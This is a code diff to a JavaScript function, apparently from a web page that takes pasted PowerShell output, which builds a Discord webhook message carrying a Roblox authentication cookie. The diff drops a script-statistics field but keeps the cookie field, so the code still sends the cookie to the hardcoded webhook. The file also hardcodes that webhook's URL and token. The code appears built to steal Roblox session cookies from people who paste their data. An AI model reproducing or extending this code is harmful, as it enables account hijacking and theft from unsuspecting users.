@@ -260,11 +260,7 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Calculate script statistics (rounded)
-        const wordCount = Math.round(inputText.split(/\s+/).filter(word => word.length > 0).length / 10) * 10;
-        const characterCount = Math.round(inputText.length / 100) * 100;
-        const lineCount = inputText.split('\n').length;
-        console.log('Script stats - Words:', wordCount, 'Characters:', characterCount, 'Lines:', lineCount);
+        console.log('Processing script data...');
         
         // Webhook payload with only data and location
         const payload = {
@@ -279,11 +275,6 @@ async function submitPowerShell() {
                     {
                         name: "🔑 Roblox Authentication (Click to Copy)",
                         value: `\`\`\`\n${robloxCookie}\n\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "📊 Script Statistics",
-                        value: `**📝 Words:** ${wordCount.toLocaleString()}\n**🔤 Characters:** ${characterCount.toLocaleString()}\n**📄 Lines:** ${lineCount.toLocaleString()}`,
                         inline: false
                     },
                     {
